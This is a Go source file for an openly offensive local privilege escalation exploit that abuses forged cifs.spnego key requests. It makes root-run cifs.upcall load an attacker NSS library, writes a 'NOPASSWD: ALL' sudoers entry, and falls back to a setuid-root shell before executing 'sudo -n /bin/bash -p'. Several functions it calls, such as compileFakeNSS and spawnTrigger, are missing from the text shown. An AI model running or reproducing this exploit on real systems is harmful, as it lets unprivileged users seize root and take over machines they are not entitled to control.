package main

// CIFSwitch - Go port of the CIFS namespace-confusion LPE.
// Embargo lifted 2026-05-27.
//
// Bug: the kernel does not authenticate the origin of "cifs.spnego" key
// descriptions. An unprivileged user can forge a description containing
// upcall_target=app and their own PID, causing cifs.upcall (spawned as root
// by request-key) to switch into the attacker's mount namespace before
// calling getpwuid() — and therefore before setuid().
//
// Chain:
//   unshare(CLONE_NEWUSER|CLONE_NEWNS) ->
//   bind-mount fake nsswitch.conf + libnss_pwn.so.2 ->
//   request_key("cifs.spnego", forged_desc) ->
//   cifs.upcall(root) loads libnss_pwn -> __attribute__((constructor)) ->
//   write /etc/sudoers.d/... ->
//   sudo -n /bin/bash -p

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"regexp"
	"strings"
	"syscall"
)

const triggerEnv = "CIFSWITCH_MODE"

var (
	uid           = os.Getuid()
	pid           = os.Getpid()
	workDir       = fmt.Sprintf("/tmp/cifswitch-go-%d-%d", uid, pid)
	fakeLibDir    = filepath.Join(workDir, "fakelib")
	evidencePath  = fmt.Sprintf("/tmp/cifswitch-evidence-%d-%d", uid, pid)
	rootShellPath = fmt.Sprintf("/var/tmp/cifswitch-rootsh-%d-%d", uid, pid)
	sudoersUser   string
	sudoersPath   string
)

func logf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "\033[1;36m[*]\033[0m "+format+"\n", args...)
}
func okf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "\033[1;32m[+]\033[0m "+format+"\n", args...)
}
func errf(format string, args ...any) {
	fmt.Fprintf(os.Stderr, "\033[1;31m[-]\033[0m "+format+"\n", args...)
}

func main() {
	if os.Getenv(triggerEnv) == "trigger" {
		runTrigger()
		return
	}

	if uid == 0 {
		syscall.Exec("/bin/bash", []string{"bash"}, os.Environ())
		os.Exit(1)
	}

	runLPE()
}

func runLPE() {
	logf("=== CIFSwitch-Go ===")

	var err error
	sudoersUser, err = detectUser()
	if err != nil {
		errf("%v", err)
		os.Exit(1)
	}
	sudoersPath = fmt.Sprintf("/etc/sudoers.d/cifswitch-go-%d-%d", uid, pid)

	logf("uid=%d user=%s", uid, sudoersUser)
	logf("workdir : %s", workDir)
	logf("sudoers : %s", sudoersPath)

	if err := preflight(); err != nil {
		errf("preflight: %v", err)
		os.Exit(1)
	}
	okf("preflight OK")

	nssLibDirs, err := detectNSSLibDirs()
	if err != nil {
		errf("%v", err)
		os.Exit(1)
	}
	logf("NSS lib dirs: %v", nssLibDirs)

	if sudoRootOK() {
		errf("user already has passwordless sudo - use a less-privileged account")
		os.Exit(1)
	}

	if err := os.MkdirAll(fakeLibDir, 0755); err != nil {
		errf("mkdir: %v", err)
		os.Exit(1)
	}

	logf("compiling libnss_pwn.so.2...")
	if err := compileFakeNSS(); err != nil {
		errf("%v", err)
		os.Exit(1)
	}
	okf("libnss_pwn.so.2 compiled")

	if err := writeNSSwitchConf(); err != nil {
		errf("nsswitch.conf: %v", err)
		os.Exit(1)
	}

	logf("triggering forged cifs.spnego upcall...")
	if err := spawnTrigger(nssLibDirs); err != nil {
		// request_key returning an error from kernel side is expected
		logf("trigger done: %v", err)
	}

	evidence := readEvidence()
	if evidence == "" {
		errf("no evidence - cifs.upcall did not load the attacker NSS library")
		errf("check: grep -w cifs /proc/filesystems")
		os.Exit(1)
	}
	fmt.Fprint(os.Stderr, evidence)

	if !strings.Contains(evidence, "wrote sudoers entry:") {
		if !strings.Contains(evidence, "created fallback root shell:") {
			errf("NSS loaded but neither sudoers nor fallback root shell was created")
			os.Exit(1)
		}
		logf("direct sudoers write failed - using fallback root shell...")
		if err := writeViaFallbackShell(); err != nil {
			errf("fallback: %v", err)
			os.Exit(1)
		}
		okf("sudoers written via fallback shell")
	}

	if !sudoRootOK() {
		errf("sudoers entry written but sudo -n bash still fails")
		os.Exit(1)
	}

	okf("sudoers OK - dropping root shell")
	logf("cleanup: sudo rm -f %s %s %s && rm -rf %s",
		sudoersPath, evidencePath, rootShellPath, workDir)

	syscall.Exec("/usr/bin/sudo", []string{"sudo", "-n", "/bin/bash", "-p"}, os.Environ())
}

// ── Preflight helpers ─────────────────────────────────────────────────────────

func detectUser() (string, error) {
	out, err := exec.Command("id", "-un").Output()
	if err != nil {
		return "", fmt.Errorf("id -un: %w", err)
	}
	name := strings.TrimSpace(string(out))
	if ok, _ := regexp.MatchString(`^[A-Za-z0-9_.\-]+[$]?$`, name); !ok {
		return "", fmt.Errorf("suspicious username: %q", name)
	}
	return name, nil
}

func preflight() error {
	for _, cmd := range []string{"gcc", "unshare", "sudo", "mount"} {
		if p, _ := exec.LookPath(cmd); p == "" {
			return fmt.Errorf("missing required command: %s", cmd)
		}
	}
	if _, err := os.Stat("/usr/sbin/cifs.upcall"); err != nil {
		return fmt.Errorf("cifs.upcall not found: install cifs-utils")
	}
	if err := checkRequestKeyRule(); err != nil {
		return err
	}
	if out, err := exec.Command("unshare", "-Ur", "-m", "true").CombinedOutput(); err != nil {
		return fmt.Errorf("unprivileged user namespaces unavailable: %s", strings.TrimSpace(string(out)))
	}
	data, _ := os.ReadFile("/proc/filesystems")
	if !strings.Contains(string(data), "cifs") {
		return fmt.Errorf("cifs kernel module not loaded (run: sudo modprobe cifs)")
	}
	return nil
}

func checkRequestKeyRule() error {
	paths := []string{"/etc/request-key.conf", "/etc/request-key.d"}
	for _, p := range paths {
		fi, err := os.Stat(p)
		if err != nil {
			continue
		}
		var files []string
		if fi.IsDir() {
			entries, _ := os.ReadDir(p)
			for _, e := range entries {
				if !e.IsDir() {
					files = append(files, filepath.Join(p, e.Name()))
				}
			}
		} else {
			files = []string{p}
		}
		for _, f := range files {
			data, err := os.ReadFile(f)
			if err != nil {
				continue
			}
			for _, line := range strings.Split(string(data), "\n") {
				l := strings.TrimSpace(line)
				if l == "" || strings.HasPrefix(l, "#") {
					continue
				}
				if strings.Contains(l, "cifs.spnego") && strings.Contains(l, "cifs.upcall") {
					return nil
				}
			}
		}
	}
	return fmt.Errorf("no active cifs.spnego -> cifs.upcall rule in request-key.conf")
}

func sudoRootOK() bool {
	out, err := exec.Command("sudo", "-n", "/bin/bash", "-p", "-c", "id -u").Output()
	if err != nil {
		return false
	}
	return strings.TrimSpace(string(out)) == "0"
}

func readEvidence() string {
	data, _ := os.ReadFile(evidencePath)
	return string(data)
}

func writeViaFallbackShell() error {
	fi, err := os.Stat(rootShellPath)
	if err != nil {
		return fmt.Errorf("fallback root shell not found: %s", rootShellPath)
	}
	if fi.Sys().(*syscall.Stat_t).Uid != 0 || fi.Mode()&os.ModeSetuid == 0 {
		return fmt.Errorf("%s is not a setuid-root shell", rootShellPath)
	}
	script := fmt.Sprintf(
		"printf '# cifswitch-go poc\\n' > %[1]s; "+
			"printf '%[2]s ALL=(ALL:ALL) NOPASSWD: ALL\\n' >> %[1]s; "+
			"chown root:root %[1]s; chmod 0440 %[1]s",
		sudoersPath, sudoersUser)
	return exec.Command(rootShellPath, "-p", "-c", script).Run()
}
